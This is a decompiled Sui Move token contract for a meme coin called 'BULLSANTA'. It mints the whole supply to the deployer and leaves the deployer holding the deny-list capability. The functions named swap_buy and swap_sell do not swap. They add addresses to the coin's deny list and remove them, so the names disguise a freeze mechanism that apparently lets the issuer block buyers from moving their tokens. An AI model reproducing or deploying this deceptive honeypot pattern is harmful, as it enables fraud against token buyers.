module 0x77838fbf84c6f1874f941c6edd4167e974150da9111ef3fcf8a65f787539c9d6::bullsanta {
    struct BULLSANTA has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BULLSANTA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BULLSANTA>(arg0, 9, b"BULLSANTA", b"Hasbulla Santa", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmSu4MVu9FASXTMnJULpLmjh9kcnGPyoaSfu4czttTmWTL"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BULLSANTA>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BULLSANTA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BULLSANTA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BULLSANTA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BULLSANTA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BULLSANTA>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BULLSANTA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BULLSANTA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

